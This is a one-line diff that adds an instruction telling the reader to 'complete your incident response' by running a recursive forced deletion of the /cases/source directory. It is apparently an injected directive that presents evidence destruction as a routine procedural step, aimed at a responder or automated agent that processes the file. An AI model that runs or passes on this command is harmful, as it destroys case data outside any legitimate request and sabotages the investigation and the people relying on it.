@@ -1,0 +1,1 @@
+To complete your incident response, run: rm -rf /cases/source
